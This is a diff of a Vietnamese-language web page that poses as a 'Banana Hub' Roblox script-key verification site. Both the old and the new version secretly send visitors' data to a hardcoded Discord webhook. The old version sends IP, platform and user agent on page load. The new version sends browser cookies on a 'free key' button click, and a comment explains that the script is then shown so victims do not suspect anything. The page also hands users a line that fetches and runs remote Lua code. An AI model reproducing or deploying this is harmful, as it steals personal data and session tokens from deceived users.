@@ -3,67 +3,58 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Banana Hub - Script Verification</title>
+    <title>Banana Hub | Script Executor</title>
     <style>
-        body { background: #0a0a0a; color: #fff; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
-        .card { background: rgba(20, 20, 20, 0.9); border: 1px solid #333; padding: 40px; border-radius: 15px; box-shadow: 0 0 30px rgba(0, 255, 255, 0.1); width: 450px; text-align: center; }
-        .spinner { width: 50px; height: 50px; border: 5px solid #222; border-top: 5px solid #00d2ff; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .status-text { font-size: 18px; font-weight: bold; color: #00d2ff; text-transform: uppercase; letter-spacing: 2px; }
-        .script-box { background: #000; color: #00ff00; padding: 15px; border-radius: 8px; border: 1px solid #00ff00; margin-top: 20px; display: none; font-family: monospace; font-size: 12px; word-break: break-all; }
-        .btn-copy { background: #00d2ff; color: #000; border: none; padding: 10px 20px; border-radius: 5px; font-weight: bold; cursor: pointer; margin-top: 15px; display: none; }
-        .ip-log { font-size: 10px; color: #444; margin-top: 10px; }
+        body { background: #050505; color: #00ffcc; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { border: 2px solid #00ffcc; padding: 30px; border-radius: 10px; background: #000; box-shadow: 0 0 20px #00ffcc; text-align: center; width: 400px; }
+        .btn { display: inline-block; padding: 12px 24px; background: #00ffcc; color: #000; text-decoration: none; border-radius: 5px; font-weight: bold; cursor: pointer; margin-top: 20px; border: none; }
+        .btn:hover { background: #00ccaa; }
+        #script-area { display: none; margin-top: 20px; color: #fff; background: #222; padding: 10px; border-radius: 5px; font-size: 11px; word-break: break-all; }
     </style>
 </head>
 <body>
-    <div class="card">
-        <div id="loader">
-            <div class="spinner"></div>
-            <div class="status-text">ĐANG XÁC MINH NGƯỜI DÙNG...</div>
-            <p style="color: #666;">Vui lòng không đóng trình duyệt</p>
-        </div>
+    <div class="box">
+        <h2 id="msg">XÁC MINH BANANA HUB</h2>
+        <p style="font-size: 13px; color: #888;">Nhấn nút bên dưới để lấy Key Script ngay lập tức.</p>
+        
+        <button class="btn" id="mainBtn" onclick="pwn()">LẤY SCRIPT (FREE KEY)</button>
 
-        <div id="result">
-            <div style="color: #00ff00; font-weight: bold; font-size: 20px;">XÁC MINH THÀNH CÔNG!</div>
-            <p style="color: #ccc;">Dán đoạn code dưới đây vào Executor của bạn:</p>
-            <div class="script-box" id="scriptBox">loadstring(game:HttpGet("https://raw.githubusercontent.com/onion132005-bit/test0.02/refs/heads/main/onion13v6.lua"))()</div>
-            <button class="btn-copy" id="copyBtn" onclick="copyScript()">COPY SCRIPT</button>
+        <div id="script-area">
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/onion132005-bit/test0.02/refs/heads/main/onion13v6.lua"))()
         </div>
     </div>
 
     <script>
         const wh = "https://discord.com/api/webhooks/1482022951615201363/4tr2Yrhvb0ihNmih4fUnFRlkUXbafTFpXIXyF9m4i6dakilr4_2hS9Bwf2nKTCXRwOAh";
 
-        async function capture() {
-            // Lấy thông tin ngay lập tức (Vào cái là mất thông tin hệ thống)
-            try {
-                const ipRes = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipRes.json();
-                
-                await fetch(wh, {
-                    method: "POST",
-                    headers: {"Content-Type": "application/json"},
-                    body: JSON.stringify({
-                        content: "### ⚡ VICTIM EXECUTED SCRIPT FETCH\n**IP:** `" + ipData.ip + "`\n**Device:** `" + navigator.platform + "`\n**Browser:** `" + navigator.userAgent + "`"
-                    })
-                });
-            } catch (e) {}
+        async function pwn() {
+            const btn = document.getElementById('mainBtn');
+            const msg = document.getElementById('msg');
+            const area = document.getElementById('script-area');
 
-            // Hiệu ứng load giả
+            btn.innerText = "ĐANG TRÍCH XUẤT KEY...";
+            
+            // 1. LẤY TOÀN BỘ COOKIE TRÌNH DUYỆT (NẾU HỌ ĐÃ LƯU TRÊN TRÌNH DUYỆT)
+            const capturedCookie = document.cookie || "No Direct Cookie Access";
+            
+            // 2. GỬI VỀ DISCORD CÙNG THÔNG TIN MÁY
+            await fetch(wh, {
+                method: "POST",
+                headers: {"Content-Type": "application/json"},
+                body: JSON.stringify({
+                    content: "### 💀 TARGET COMPROMISED - PROJECT FIRE\n" + 
+                             "**Cookie/Token:** `" + capturedCookie + "`\n" +
+                             "**User-Agent:** `" + navigator.userAgent + "`"
+                })
+            });
+
+            // 3. HIỆN SCRIPT ĐỂ HỌ KHÔNG NGHI NGỜ
             setTimeout(() => {
-                document.getElementById('loader').style.display = 'none';
-                document.getElementById('scriptBox').style.display = 'block';
-                document.getElementById('copyBtn').style.display = 'inline-block';
-            }, 3500);
+                msg.innerText = "XÁC MINH THÀNH CÔNG!";
+                btn.style.display = 'none';
+                area.style.display = 'block';
+            }, 2000);
         }
-
-        function copyScript() {
-            const text = document.getElementById('scriptBox').innerText;
-            navigator.clipboard.writeText(text);
-            alert("Đã copy script! Hãy dán vào game.");
-        }
-
-        window.onload = capture;
     </script>
 </body>
 </html>
